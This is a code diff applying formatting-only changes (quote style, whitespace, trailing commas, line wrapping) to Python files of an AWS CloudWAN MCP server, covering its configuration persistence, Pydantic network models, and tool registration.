--- awslabs/__init__.py
+++ awslabs/__init__.py
@@ -14,4 +14,4 @@
 
 """AWS Labs namespace package."""
 
-__path__ = __import__('pkgutil').extend_path(__path__, __name__)
+__path__ = __import__("pkgutil").extend_path(__path__, __name__)

--- awslabs/cloudwan_mcp_server/config/cache_config.py
+++ awslabs/cloudwan_mcp_server/config/cache_config.py
@@ -5,6 +5,7 @@
 
 class CacheConfig(BaseSettings):
     """Configuration for caching behavior."""
+
     client_pool_size: int = 100
     idle_timeout_seconds: int = 300
     max_memory_mb: int = 512
@@ -13,12 +14,14 @@
 
     class Config:
         """Pydantic configuration."""
+
         env_prefix = "CLOUDWAN_CACHE_"
         case_sensitive = False
 
 
 class MonitoringConfig(BaseSettings):
     """Configuration for monitoring and circuit breakers."""
+
     metrics_interval: float = Field(1.0, env="CLOUDWAN_METRICS_INTERVAL")
     circuit_breaker_threshold: int = Field(5, env="CLOUDWAN_CIRCUIT_BREAKER_THRESHOLD")
     health_check_timeout: float = Field(5.0, env="CLOUDWAN_HEALTH_CHECK_TIMEOUT")
@@ -26,5 +29,6 @@
 
 class ProductionConfig(BaseSettings):
     """Production-ready configuration combining cache and monitoring."""
+
     cache: CacheConfig = Field(default_factory=CacheConfig)
     monitoring: MonitoringConfig = Field(default_factory=MonitoringConfig)

--- awslabs/cloudwan_mcp_server/config/tool_config.py
+++ awslabs/cloudwan_mcp_server/config/tool_config.py
@@ -7,6 +7,7 @@
 
 class ToolConfiguration(BaseModel):
     """Configuration for individual tools."""
+
     enabled: bool = True
     timeout_seconds: int = 30
     max_retries: int = 3

--- awslabs/cloudwan_mcp_server/config_manager.py
+++ awslabs/cloudwan_mcp_server/config_manager.py
@@ -27,10 +27,10 @@
 
 class ConfigPersistence:
     """Handles persistent storage of AWS configuration."""
-    
+
     def __init__(self, config_dir: Optional[Path] = None):
         """Initialize config persistence.
-        
+
         Args:
             config_dir: Directory to store config files. Defaults to ~/.cloudwan-mcp/
         """
@@ -39,18 +39,18 @@
         self.config_dir = Path(config_dir)
         self.config_file = self.config_dir / "config.json"
         self.history_file = self.config_dir / "config_history.json"
-        
+
         # Ensure config directory exists
         self.config_dir.mkdir(parents=True, exist_ok=True)
-    
+
     def save_current_config(self, profile: str, region: str, metadata: Optional[Dict] = None) -> bool:
         """Save current configuration.
-        
+
         Args:
             profile: AWS profile name
             region: AWS region
             metadata: Additional metadata to store
-            
+
         Returns:
             True if saved successfully, False otherwise
         """
@@ -59,109 +59,89 @@
                 "aws_profile": profile,
                 "aws_region": region,
                 "timestamp": datetime.utcnow().isoformat(),
-                "metadata": metadata or {}
+                "metadata": metadata or {},
             }
-            
+
             # Save current config
-            with open(self.config_file, 'w') as f:
+            with open(self.config_file, "w") as f:
                 json.dump(config_data, f, indent=2)
-            
+
             # Append to history
             history = self._load_history()
             history.append(config_data)
             # Keep last 100 entries
             history = history[-100:]
-            
-            with open(self.history_file, 'w') as f:
+
+            with open(self.history_file, "w") as f:
                 json.dump(history, f, indent=2)
-            
+
             logger.info(f"Configuration saved: profile={profile}, region={region}")
             return True
-            
+
         except Exception as e:
             logger.error(f"Failed to save configuration: {e}")
             return False
-    
+
     def load_current_config(self) -> Optional[Dict]:
         """Load current configuration.
-        
+
         Returns:
             Configuration dict or None if not found
         """
         try:
             if self.config_file.exists():
-                with open(self.config_file, 'r') as f:
+                with open(self.config_file, "r") as f:
                     return json.load(f)
             return None
         except Exception as e:
             logger.error(f"Failed to load configuration: {e}")
             return None
-    
+
     def get_config_history(self, limit: int = 20) -> List[Dict]:
         """Get configuration history.
-        
+
         Args:
             limit: Maximum number of entries to return
-            
+
         Returns:
             List of configuration entries
         """
         history = self._load_history()
         return history[-limit:] if history else []
-    
+
     def validate_config_file(self) -> Dict:
         """Validate configuration file integrity.
-        
+
         Returns:
             Validation result dict
         """
         try:
             if not self.config_file.exists():
-                return {
-                    "valid": False,
-                    "error": "Configuration file does not exist",
-                    "path": str(self.config_file)
-                }
-            
-            with open(self.config_file, 'r') as f:
+                return {"valid": False, "error": "Configuration file does not exist", "path": str(self.config_file)}
+
+            with open(self.config_file, "r") as f:
                 config = json.load(f)
-            
+
             required_fields = ["aws_profile", "aws_region", "timestamp"]
             missing_fields = [f for f in required_fields if f not in config]
-            
+
             if missing_fields:
-                return {
-                    "valid": False,
-                    "error": f"Missing required fields: {missing_fields}",
-                    "config": config
-                }
-            
-            return {
-                "valid": True,
-                "config": config,
-                "path": str(self.config_file)
-            }
-            
+                return {"valid": False, "error": f"Missing required fields: {missing_fields}", "config": config}
+
+            return {"valid": True, "config": config, "path": str(self.config_file)}
+
         except json.JSONDecodeError as e:
-            return {
-                "valid": False,
-                "error": f"Invalid JSON: {e}",
-                "path": str(self.config_file)
-            }
+            return {"valid": False, "error": f"Invalid JSON: {e}", "path": str(self.config_file)}
         except Exception as e:
-            return {
-                "valid": False,
-                "error": str(e),
-                "path": str(self.config_file)
-            }
-    
+            return {"valid": False, "error": str(e), "path": str(self.config_file)}
+
     def restore_config(self, profile: str, region: str) -> bool:
         """Restore configuration by setting environment variables.
-        
+
         Args:
             profile: AWS profile to restore
             region: AWS region to restore
-            
+
         Returns:
             True if restored successfully
         """
@@ -173,16 +153,16 @@
         except Exception as e:
             logger.error(f"Failed to restore configuration: {e}")
             return False
-    
+
     def _load_history(self) -> List[Dict]:
         """Load configuration history.
-        
+
         Returns:
             List of historical configurations
         """
         try:
             if self.history_file.exists():
-                with open(self.history_file, 'r') as f:
+                with open(self.history_file, "r") as f:
                     return json.load(f)
             return []
         except Exception:
@@ -191,16 +171,16 @@
 
 class AWSConfigManager:
     """AWS configuration manager with persistence support."""
-    
+
     def __init__(self):
         """Initialize AWS config manager."""
         self.persistence = ConfigPersistence()
-    
+
     @property
     def profile(self) -> Optional[str]:
         """Get current AWS profile."""
         return os.environ.get("AWS_PROFILE")
-    
+
     @property
     def default_region(self) -> str:
         """Get current AWS region."""

--- awslabs/cloudwan_mcp_server/models/__init__.py
+++ awslabs/cloudwan_mcp_server/models/__init__.py
@@ -16,4 +16,4 @@
 
 from . import aws_models, network_models
 
-__all__ = ["aws_models", "network_models"]
\ No newline at end of file
+__all__ = ["aws_models", "network_models"]

--- awslabs/cloudwan_mcp_server/models/aws_models.py
+++ awslabs/cloudwan_mcp_server/models/aws_models.py
@@ -21,7 +21,7 @@
 
 class CoreNetwork(BaseModel):
     """Model for CloudWAN Core Network."""
-    
+
     core_network_id: str = Field(..., description="Core network ID")
     global_network_id: str = Field(..., description="Global network ID")
     state: str = Field(..., description="Core network state")
@@ -32,7 +32,7 @@
 
 class CoreNetworkPolicy(BaseModel):
     """Model for CloudWAN Core Network Policy."""
-    
+
     core_network_id: str = Field(..., description="Core network ID")
     policy_version_id: str = Field(..., description="Policy version ID")
     policy_document: Optional[Dict[str, Any]] = Field(None, description="Policy document")
@@ -43,7 +43,7 @@
 
 class TransitGatewayRoute(BaseModel):
     """Model for Transit Gateway route information."""
-    
+
     destination_cidr: str = Field(..., description="Destination CIDR")
     route_table_id: str = Field(..., description="Route table ID")
     state: str = Field(..., description="Route state")
@@ -54,7 +54,7 @@
 
 class TransitGatewayPeering(BaseModel):
     """Model for Transit Gateway peering attachment."""
-    
+
     peer_id: str = Field(..., description="Peering attachment ID")
     region: str = Field(..., description="AWS region")
     state: str = Field(..., description="Peering state")
@@ -66,7 +66,7 @@
 
 class VPCResource(BaseModel):
     """Model for VPC resource information."""
-    
+
     vpc_id: str = Field(..., description="VPC ID")
     region: str = Field(..., description="AWS region")
     cidr_block: str = Field(..., description="Primary CIDR block")
@@ -77,10 +77,10 @@
 
 class GlobalNetwork(BaseModel):
     """Model for Global Network resource."""
-    
+
     global_network_id: str = Field(..., description="Global network ID")
     global_network_arn: str = Field(..., description="Global network ARN")
     description: Optional[str] = Field(None, description="Global network description")
     state: str = Field(..., description="Global network state")
     created_at: Optional[str] = Field(None, description="Creation timestamp")
-    tags: Optional[List[Dict[str, str]]] = Field(None, description="Global network tags")
\ No newline at end of file
+    tags: Optional[List[Dict[str, str]]] = Field(None, description="Global network tags")

--- awslabs/cloudwan_mcp_server/models/network_models.py
+++ awslabs/cloudwan_mcp_server/models/network_models.py
@@ -22,9 +22,9 @@
 
 class NetworkPath(BaseModel):
     """Model for network path tracing results."""
-    
+
     source_ip: str = Field(..., description="Source IP address")
-    destination_ip: str = Field(..., description="Destination IP address") 
+    destination_ip: str = Field(..., description="Destination IP address")
     region: str = Field(..., description="AWS region")
     total_hops: int = Field(..., description="Total number of hops")
     status: str = Field(..., description="Path status (reachable, unreachable)")
@@ -42,7 +42,7 @@
 
 class IPDetails(BaseModel):
     """Model for IP address analysis results."""
-    
+
     ip_address: str = Field(..., description="IP address")
     region: str = Field(..., description="AWS region")
     ip_version: int = Field(..., description="IP version (4 or 6)")
@@ -62,7 +62,7 @@
 
 class CIDRValidation(BaseModel):
     """Model for CIDR validation results."""
-    
+
     operation: str = Field(..., description="Validation operation")
     network: str = Field(..., description="Network CIDR")
     network_address: str = Field(..., description="Network address")
@@ -82,7 +82,7 @@
 
 class NetworkFunctionGroup(BaseModel):
     """Model for Network Function Group details."""
-    
+
     name: str = Field(..., description="NFG name")
     description: Optional[str] = Field(None, description="NFG description")
     status: str = Field(..., description="NFG status")
@@ -91,7 +91,7 @@
 
 class SegmentRouteAnalysis(BaseModel):
     """Model for segment routing analysis results."""
-    
+
     core_network_id: str = Field(..., description="Core network ID")
     segment_name: str = Field(..., description="Segment name")
     region: str = Field(..., description="AWS region")
@@ -104,7 +104,7 @@
 
 class NetworkFirewall(BaseModel):
     """Model for AWS Network Firewall details."""
-    
+
     firewall_name: str = Field(..., description="Network Firewall name")
     firewall_arn: str = Field(..., description="Network Firewall ARN")
     vpc_id: str = Field(..., description="VPC ID where firewall is deployed")
@@ -116,18 +116,20 @@
 
 class FirewallPolicy(BaseModel):
     """Model for AWS Network Firewall policy details."""
-    
+
     policy_arn: str = Field(..., description="Policy ARN")
     policy_name: str = Field(..., description="Policy name")
     stateless_rule_groups: int = Field(..., description="Number of stateless rule groups")
     stateful_rule_groups: int = Field(..., description="Number of stateful rule groups")
-    stateless_default_actions: List[str] = Field(default_factory=list, description="Default actions for stateless rules")
+    stateless_default_actions: List[str] = Field(
+        default_factory=list, description="Default actions for stateless rules"
+    )
     logging_enabled: bool = Field(..., description="Whether logging is enabled")
 
 
 class SuricataRule(BaseModel):
     """Model for parsed Suricata rule details."""
-    
+
     action: str = Field(..., description="Rule action (alert, drop, pass, etc.)")
     protocol: str = Field(..., description="Protocol (TCP, UDP, ICMP, etc.)")
     src_ip: Optional[str] = Field(None, description="Source IP or CIDR")
@@ -141,7 +143,7 @@
 
 class FlowLog(BaseModel):
     """Model for Network Firewall flow log entry."""
-    
+
     timestamp: str = Field(..., description="Log timestamp")
     firewall_name: str = Field(..., description="Firewall name")
     source_ip: str = Field(..., description="Source IP address")
@@ -150,7 +152,7 @@
     destination_port: int = Field(..., description="Destination port")
     protocol: str = Field(..., description="Protocol")
     action: str = Field(..., description="Action taken (ALLOW, DENY)")
-    
+
     @validator("source_ip", "destination_ip")
     def validate_ip_address(cls, v):
         """Validate IP address format."""
@@ -163,7 +165,7 @@
 
 class FiveTupleFlow(BaseModel):
     """Model for 5-tuple flow analysis."""
-    
+
     source_ip: str = Field(..., description="Source IP address")
     destination_ip: str = Field(..., description="Destination IP address")
     protocol: str = Field(..., description="Protocol (TCP, UDP, ICMP)")
@@ -171,7 +173,7 @@
     destination_port: int = Field(..., ge=1, le=65535, description="Destination port")
     firewall_decision: str = Field(..., description="Firewall decision (ALLOW, DENY)")
     rule_matches: List[Dict[str, Any]] = Field(default_factory=list, description="Matching rules")
-    
+
     @validator("source_ip", "destination_ip")
     def validate_ip_address(cls, v):
         """Validate IP address format."""
@@ -184,7 +186,7 @@
 
 class PolicySimulation(BaseModel):
     """Model for policy change simulation results."""
-    
+
     firewall_name: str = Field(..., description="Firewall name")
     change_description: str = Field(..., description="Description of policy changes")
     flows_analyzed: int = Field(..., description="Number of flows analyzed")
@@ -192,4 +194,4 @@
     newly_allowed: int = Field(..., description="Flows that would be newly allowed")
     no_change: int = Field(..., description="Flows with no impact")
     detailed_analysis: List[Dict[str, Any]] = Field(default_factory=list, description="Detailed flow analysis")
-    recommendations: List[Dict[str, str]] = Field(default_factory=list, description="Policy recommendations")
\ No newline at end of file
+    recommendations: List[Dict[str, str]] = Field(default_factory=list, description="Policy recommendations")

--- awslabs/cloudwan_mcp_server/modular_server.py
+++ awslabs/cloudwan_mcp_server/modular_server.py
@@ -67,10 +67,12 @@
 
 # AWS client cache with thread-safe LRU implementation (reused from original)
 @lru_cache(maxsize=10)
-def _create_client(service: str, region: str, profile: str | None = None, custom_endpoints: str | None = None) -> boto3.client:
+def _create_client(
+    service: str, region: str, profile: str | None = None, custom_endpoints: str | None = None
+) -> boto3.client:
     """Thread-safe client creation helper."""
     import json
-    
+
     config = Config(region_name=region, retries={"max_attempts": 3, "mode": "adaptive"}, max_pool_connections=10)
 
     # Handle custom endpoints from parameter (for cache key inclusion)
@@ -91,7 +93,7 @@
 def get_aws_client(service: str, region: str | None = None) -> boto3.client:
     """Get AWS client with caching and standard configuration."""
     import os
-    
+
     region = region or aws_config.default_region
     profile = aws_config.profile
     custom_endpoints = os.getenv("CLOUDWAN_AWS_CUSTOM_ENDPOINTS")
@@ -123,9 +125,9 @@
         for i, tool_instance in enumerate(tool_instances, 1):
             tool_name = tool_instance.__class__.__name__
             logger.info(f"  {i}. {tool_name}")
-        
+
         logger.info("Modular tool registration complete. Starting MCP server...")
-        
+
     except Exception as e:
         logger.error(f"Failed to register modular tools: {e}")
         sys.exit(1)
@@ -140,4 +142,4 @@
 
 
 if __name__ == "__main__":
-    main()
\ No newline at end of file
+    main()

--- awslabs/cloudwan_mcp_server/server.py
+++ awslabs/cloudwan_mcp_server/server.py
@@ -107,10 +107,12 @@
 
 # AWS client cache with thread-safe LRU implementation
 @lru_cache(maxsize=10)
-def _create_client(service: str, region: str, profile: str | None = None, custom_endpoints: str | None = None) -> boto3.client:  # Added return type
+def _create_client(
+    service: str, region: str, profile: str | None = None, custom_endpoints: str | None = None
+) -> boto3.client:  # Added return type
     """Thread-safe client creation helper."""
     import json
-    
+
     config = Config(region_name=region, retries={"max_attempts": 3, "mode": "adaptive"}, max_pool_connections=10)
 
     # Handle custom endpoints from parameter (for cache key inclusion)
@@ -131,7 +133,7 @@
 def get_aws_client(service: str, region: str | None = None) -> boto3.client:  # Added return type
     """Get AWS client with caching and standard configuration."""
     import os
-    
+
     region = region or aws_config.default_region
     profile = aws_config.profile
     custom_endpoints = os.getenv("CLOUDWAN_AWS_CUSTOM_ENDPOINTS")
@@ -396,21 +398,21 @@
     """Discover ENI associated with IP address."""
     try:
         ec2_client = get_aws_client("ec2", region)
-        
+
         # Search by private IP addresses
         response = ec2_client.describe_network_interfaces(
             Filters=[{"Name": "addresses.private-ip-address", "Values": [ip_address]}]
         )
-        
+
         enis = response.get("NetworkInterfaces", [])
-        
+
         # If not found, search by public IP (for EIPs)
         if not enis:
             response = ec2_client.describe_network_interfaces(
                 Filters=[{"Name": "association.public-ip", "Values": [ip_address]}]
             )
             enis = response.get("NetworkInterfaces", [])
-        
+
         if enis:
             eni = enis[0]  # Use first ENI found
             return {
@@ -422,11 +424,11 @@
                 "availability_zone": eni.get("AvailabilityZone"),
                 "security_groups": [sg["GroupId"] for sg in eni.get("Groups", [])],
                 "attachment": eni.get("Attachment", {}),
-                "status": eni.get("Status")
+                "status": eni.get("Status"),
             }
-        
+
         return {"eni_found": False}
-        
+
     except Exception as e:
         logger.warning(f"ENI discovery failed for {ip_address}: {str(e)}")
         return {"eni_found": False, "error": sanitize_error_message(str(e))}
@@ -436,15 +438,11 @@
     """Get routing table context for subnet."""
     try:
         ec2_client = get_aws_client("ec2", region)
-        
-        response = ec2_client.describe_route_tables(
-            Filters=[
-                {"Name": "association.subnet-id", "Values": [subnet_id]}
-            ]
-        )
-        
+
+        response = ec2_client.describe_route_tables(Filters=[{"Name": "association.subnet-id", "Values": [subnet_id]}])
+
         route_tables = response.get("RouteTables", [])
-        
+
         if route_tables:
             rt = route_tables[0]
             return {
@@ -452,11 +450,11 @@
                 "route_table_id": rt.get("RouteTableId"),
                 "routes": rt.get("Routes", []),
                 "associations": rt.get("Associations", []),
-                "propagating_vgws": rt.get("PropagatingVgws", [])
+                "propagating_vgws": rt.get("PropagatingVgws", []),
             }
-        
+
         return {"route_table_found": False}
-        
+
     except Exception as e:
         logger.warning(f"Route table discovery failed for subnet {subnet_id}: {str(e)}")
         return {"route_table_found": False, "error": sanitize_error_message(str(e))}
@@ -467,29 +465,27 @@
     try:
         if not security_group_ids:
             return {"security_groups_found": False}
-            
+
         ec2_client = get_aws_client("ec2", region)
-        
+
         response = ec2_client.describe_security_groups(GroupIds=security_group_ids)
         security_groups = response.get("SecurityGroups", [])
-        
+
         sg_details = []
         for sg in security_groups:
-            sg_details.append({
-                "group_id": sg.get("GroupId"),
-                "group_name": sg.get("GroupName"),
-                "description": sg.get("Description"),
-                "ingress_rules": sg.get("IpPermissions", []),
-                "egress_rules": sg.get("IpPermissionsEgress", []),
-                "vpc_id": sg.get("VpcId")
-            })
-        
-        return {
-            "security_groups_found": True,
-            "security_groups": sg_details,
-            "total_count": len(sg_details)
-        }
-        
+            sg_details.append(
+                {
+                    "group_id": sg.get("GroupId"),
+                    "group_name": sg.get("GroupName"),
+                    "description": sg.get("Description"),
+                    "ingress_rules": sg.get("IpPermissions", []),
+                    "egress_rules": sg.get("IpPermissionsEgress", []),
+                    "vpc_id": sg.get("VpcId"),
+                }
+            )
+
+        return {"security_groups_found": True, "security_groups": sg_details, "total_count": len(sg_details)}
+
     except Exception as e:
         logger.warning(f"Security group discovery failed: {str(e)}")
         return {"security_groups_found": False, "error": sanitize_error_message(str(e))}
@@ -500,18 +496,18 @@
     try:
         if not eni_info.get("eni_found") or not eni_info.get("attachment"):
             return {"resources_found": False}
-            
+
         attachment = eni_info["attachment"]
         instance_id = attachment.get("InstanceId")
-        
+
         if not instance_id:
             return {"resources_found": False, "reason": "No instance attachment"}
-            
+
         ec2_client = get_aws_client("ec2", region)
-        
+
         response = ec2_client.describe_instances(InstanceIds=[instance_id])
         reservations = response.get("Reservations", [])
-        
+
         if reservations and reservations[0].get("Instances"):
             instance = reservations[0]["Instances"][0]
             return {
@@ -520,12 +516,14 @@
                 "instance_type": instance.get("InstanceType"),
                 "instance_state": instance.get("State", {}).get("Name"),
                 "platform": instance.get("Platform"),
-                "launch_time": instance.get("LaunchTime").isoformat() if hasattr(instance.get("LaunchTime"), "isoformat") else instance.get("LaunchTime"),
-                "tags": instance.get("Tags", [])
+                "launch_time": instance.get("LaunchTime").isoformat()
+                if hasattr(instance.get("LaunchTime"), "isoformat")
+                else instance.get("LaunchTime"),
+                "tags": instance.get("Tags", []),
             }
-        
+
         return {"resources_found": False}
-        
+
     except Exception as e:
         logger.warning(f"Resource discovery failed: {str(e)}")
         return {"resources_found": False, "error": sanitize_error_message(str(e))}
@@ -534,19 +532,19 @@
 @mcp.tool(name="discover_ip_details")
 async def discover_ip_details(ip_address: str, region: str | None = None) -> str:
     """Enhanced IP details discovery with comprehensive AWS networking context.
-    
+
     Discovers and analyzes AWS networking information for a given IP address including:
-    - Elastic Network Interface (ENI) associations  
+    - Elastic Network Interface (ENI) associations
     - Subnet and VPC context with availability zone information
     - Route table entries and routing paths
     - Security group rules and network ACLs
     - Associated AWS resources (EC2 instances, etc.)
     - CloudWAN segment membership and routing policies (when applicable)
-    
+
     Args:
         ip_address: IPv4 or IPv6 address to analyze
         region: AWS region (defaults to configured region)
-        
+
     Returns:
         Comprehensive JSON response with networking context and analysis
     """
@@ -555,7 +553,7 @@
 
         # Basic IP validation
         ip_obj = ipaddress.ip_address(ip_address)
-        
+
         base_result = {
             "success": True,
             "ip_address": ip_address,
@@ -564,37 +562,46 @@
             "is_private": ip_obj.is_private,
             "is_multicast": ip_obj.is_multicast,
             "is_loopback": ip_obj.is_loopback,
-            "timestamp": dt.now().isoformat()
+            "timestamp": dt.now().isoformat(),
         }
 
         # Enhanced discovery - parallel execution for performance
         import asyncio
-        
+
         # Execute discovery tasks in parallel
-        discovery_tasks = await asyncio.gather(
-            _discover_eni_for_ip(ip_address, region),
-            return_exceptions=True
+        discovery_tasks = await asyncio.gather(_discover_eni_for_ip(ip_address, region), return_exceptions=True)
+
+        eni_result = (
+            discovery_tasks[0]
+            if discovery_tasks and not isinstance(discovery_tasks[0], Exception)
+            else {"eni_found": False}
         )
-        
-        eni_result = discovery_tasks[0] if discovery_tasks and not isinstance(discovery_tasks[0], Exception) else {"eni_found": False}
-        
+
         # Get additional context if ENI found
         if eni_result.get("eni_found"):
             subnet_id = eni_result.get("subnet_id")
             security_group_ids = eni_result.get("security_groups", [])
-            
+
             # Parallel execution for related services
             context_tasks = await asyncio.gather(
                 _get_routing_context(subnet_id, region) if subnet_id else {"route_table_found": False},
-                _get_security_group_rules(security_group_ids, region) if security_group_ids else {"security_groups_found": False},
+                _get_security_group_rules(security_group_ids, region)
+                if security_group_ids
+                else {"security_groups_found": False},
                 _discover_associated_resources(eni_result, region),
-                return_exceptions=True
+                return_exceptions=True,
+            )
+
+            routing_result = (
+                context_tasks[0] if not isinstance(context_tasks[0], Exception) else {"route_table_found": False}
+            )
+            sg_result = (
+                context_tasks[1] if not isinstance(context_tasks[1], Exception) else {"security_groups_found": False}
+            )
+            resources_result = (
+                context_tasks[2] if not isinstance(context_tasks[2], Exception) else {"resources_found": False}
             )
-            
-            routing_result = context_tasks[0] if not isinstance(context_tasks[0], Exception) else {"route_table_found": False}
-            sg_result = context_tasks[1] if not isinstance(context_tasks[1], Exception) else {"security_groups_found": False}
-            resources_result = context_tasks[2] if not isinstance(context_tasks[2], Exception) else {"resources_found": False}
-            
+
             # Combine all results
             enhanced_result = {
                 **base_result,
@@ -602,15 +609,17 @@
                     "eni_details": eni_result,
                     "routing_context": routing_result,
                     "security_groups": sg_result,
-                    "associated_resources": resources_result
+                    "associated_resources": resources_result,
                 },
                 "services_queried": 4,
-                "services_successful": sum([
-                    1 if eni_result.get("eni_found") else 0,
-                    1 if routing_result.get("route_table_found") else 0,
-                    1 if sg_result.get("security_groups_found") else 0,
-                    1 if resources_result.get("resources_found") else 0
-                ])
+                "services_successful": sum(
+                    [
+                        1 if eni_result.get("eni_found") else 0,
+                        1 if routing_result.get("route_table_found") else 0,
+                        1 if sg_result.get("security_groups_found") else 0,
+                        1 if resources_result.get("resources_found") else 0,
+                    ]
+                ),
             }
         else:
             # No ENI found - return basic IP info with attempted discovery status
@@ -622,11 +631,11 @@
                     "possible_reasons": [
                         "IP is not associated with an AWS resource",
                         "Insufficient permissions to view network interfaces",
-                        "IP is from a different AWS account or region"
-                    ]
+                        "IP is from a different AWS account or region",
+                    ],
                 },
                 "services_queried": 1,
-                "services_successful": 0
+                "services_successful": 0,
             }
 
         return safe_json_dumps(enhanced_result, indent=2)
@@ -711,7 +720,7 @@
     """Analyze Network Function Group details and policies."""
     try:
         region = region or aws_config.default_region
-        
+
         # Note: This is a simulated analysis as Network Function Groups are conceptual
         # In a real implementation, this would integrate with CloudWAN policy analysis
         result = {
@@ -1328,13 +1337,19 @@
                 validation_result = config_persistence.validate_config_file()
                 result = {"success": True, "operation": "validate_persistence", "validation": validation_result}
             else:
-                result = {"success": False, "operation": "validate_persistence", "error": "Configuration persistence not available"}
+                result = {
+                    "success": False,
+                    "operation": "validate_persistence",
+                    "error": "Configuration persistence not available",
+                }
 
         elif operation == "restore_last_config":
             if config_persistence:
                 saved_config = config_persistence.load_current_config()
                 if saved_config and "aws_profile" in saved_config and "aws_region" in saved_config:
-                    restored = config_persistence.restore_config(saved_config["aws_profile"], saved_config["aws_region"])
+                    restored = config_persistence.restore_config(
+                        saved_config["aws_profile"], saved_config["aws_region"]
+                    )
                     with _client_lock:
                         _create_client.cache_clear()
 
@@ -1345,9 +1360,17 @@
                         "cache_cleared": restored,
                     }
                 else:
-                    result = {"success": False, "operation": "restore_last_config", "error": "No saved configuration found"}
+                    result = {
+                        "success": False,
+                        "operation": "restore_last_config",
+                        "error": "No saved configuration found",
+                    }
             else:
-                result = {"success": False, "operation": "restore_last_config", "error": "Configuration persistence not available"}
+                result = {
+                    "success": False,
+                    "operation": "restore_last_config",
+                    "error": "Configuration persistence not available",
+                }
 
         else:
             return safe_json_dumps(

--- awslabs/cloudwan_mcp_server/tools/__init__.py
+++ awslabs/cloudwan_mcp_server/tools/__init__.py
@@ -25,54 +25,54 @@
 __all__ = [
     "base",
     "ConfigurationTools",
-    "CoreNetworkTools", 
+    "CoreNetworkTools",
     "DiscoveryTools",
     "NetworkAnalysisTools",
     "NFGManagementTools",
-    "TransitGatewayTools"
+    "TransitGatewayTools",
 ]
 
 
 def register_all_tools(mcp_server):
     """Register all tool modules with the MCP server.
-    
+
     This implements the modular architecture described in MODULARIZATION_STRATEGY.md,
     organizing 17 tools into 6 focused modules with single responsibility.
-    
+
     Args:
         mcp_server: FastMCP server instance
-        
+
     Returns:
         List of registered tool instances
     """
     tool_instances = []
-    
+
     # Phase 2: Core Tools Migration (highest complexity first)
-    
+
     # 1. Network Analysis Tools (3 tools - highest complexity)
     network_analysis = NetworkAnalysisTools(mcp_server)
     tool_instances.append(network_analysis)
-    
-    # 2. Core Network Management Tools (4 tools - core functionality)  
+
+    # 2. Core Network Management Tools (4 tools - core functionality)
     core_network = CoreNetworkTools(mcp_server)
     tool_instances.append(core_network)
-    
+
     # 3. Network Function Groups Tools (3 tools - specialized functionality)
     nfg_management = NFGManagementTools(mcp_server)
     tool_instances.append(nfg_management)
-    
+
     # Phase 3: Supporting Tools Migration
-    
+
     # 4. Transit Gateway Tools (3 tools)
     transit_gateway = TransitGatewayTools(mcp_server)
     tool_instances.append(transit_gateway)
-    
+
     # 5. Discovery Tools (2 tools)
     discovery = DiscoveryTools(mcp_server)
     tool_instances.append(discovery)
-    
+
     # 6. Configuration Tools (2 tools)
     configuration = ConfigurationTools(mcp_server)
     tool_instances.append(configuration)
-    
+
     return tool_instances

--- awslabs/cloudwan_mcp_server/tools/configuration.py
+++ awslabs/cloudwan_mcp_server/tools/configuration.py
@@ -24,24 +24,25 @@
 
 class ConfigurationTools:
     """Collection of configuration management tools for CloudWAN."""
-    
+
     def __init__(self, mcp_server: FastMCP) -> None:
         """Initialize configuration tools.
-        
+
         Args:
             mcp_server: FastMCP server instance
         """
         self.mcp = mcp_server
         self._register_tools()
-    
+
     def _register_tools(self) -> None:
         """Register all configuration tools with the MCP server."""
+
         # Register validate_cloudwan_policy tool
         @self.mcp.tool(name="validate_cloudwan_policy")
         async def validate_cloudwan_policy(policy_document: dict) -> str:
             """Validate CloudWAN policy configurations."""
             return await self._validate_cloudwan_policy(policy_document)
-        
+
         # Register aws_config_manager tool (imported from original server)
         @self.mcp.tool(name="aws_config_manager")
         async def aws_config_manager(operation: str, profile: str | None = None, region: str | None = None) -> str:
@@ -81,15 +82,15 @@
 
     async def _aws_config_manager(self, operation: str, profile: str | None = None, region: str | None = None) -> str:
         """Internal implementation for AWS configuration management.
-        
+
         This is imported from the original server implementation to maintain compatibility.
         """
         try:
             # Import the aws_config_manager function from the original server
             from ..server import aws_config_manager as original_aws_config_manager
-            
+
             # Call the original implementation
             return await original_aws_config_manager(operation, profile, region)
-            
+
         except Exception as e:
-            return handle_aws_error(e, "aws_config_manager")
\ No newline at end of file
+            return handle_aws_error(e, "aws_config_manager")

--- awslabs/cloudwan_mcp_server/tools/core_network.py
+++ awslabs/cloudwan_mcp_server/tools/core_network.py
@@ -25,36 +25,37 @@
 
 class CoreNetworkTools:
     """Collection of core network management tools for CloudWAN."""
-    
+
     def __init__(self, mcp_server: FastMCP) -> None:
         """Initialize core network tools.
-        
+
         Args:
             mcp_server: FastMCP server instance
         """
         self.mcp = mcp_server
         self._register_tools()
-    
+
     def _register_tools(self) -> None:
         """Register all core network tools with the MCP server."""
+
         # Register list_core_networks tool
         @self.mcp.tool(name="list_core_networks")
         async def list_core_networks(region: str | None = None) -> str:
             """List CloudWAN core networks."""
             return await self._list_core_networks(region)
-        
+
         # Register get_core_network_policy tool
         @self.mcp.tool(name="get_core_network_policy")
         async def get_core_network_policy(core_network_id: str, alias: str = "LIVE") -> str:
             """Retrieve the policy document for a CloudWAN Core Network."""
             return await self._get_core_network_policy(core_network_id, alias)
-        
+
         # Register get_core_network_change_set tool
         @self.mcp.tool(name="get_core_network_change_set")
         async def get_core_network_change_set(core_network_id: str, policy_version_id: str) -> str:
             """Retrieve policy change sets for a CloudWAN Core Network."""
             return await self._get_core_network_change_set(core_network_id, policy_version_id)
-        
+
         # Register get_core_network_change_events tool
         @self.mcp.tool(name="get_core_network_change_events")
         async def get_core_network_change_events(core_network_id: str, policy_version_id: str) -> str:
@@ -82,10 +83,10 @@
                 )
 
             result = {
-                "success": True, 
-                "region": region, 
-                "total_count": len(core_networks), 
-                "core_networks": core_networks
+                "success": True,
+                "region": region,
+                "total_count": len(core_networks),
+                "core_networks": core_networks,
             }
 
             return safe_json_dumps(result, indent=2)
@@ -125,8 +126,7 @@
             client = get_aws_client("networkmanager")  # Region already handled
 
             response = client.get_core_network_change_set(
-                CoreNetworkId=core_network_id, 
-                PolicyVersionId=policy_version_id
+                CoreNetworkId=core_network_id, PolicyVersionId=policy_version_id
             )
 
             result = {
@@ -147,8 +147,7 @@
             client = get_aws_client("networkmanager")  # Region already handled
 
             response = client.get_core_network_change_events(
-                CoreNetworkId=core_network_id, 
-                PolicyVersionId=policy_version_id
+                CoreNetworkId=core_network_id, PolicyVersionId=policy_version_id
             )
 
             result = {
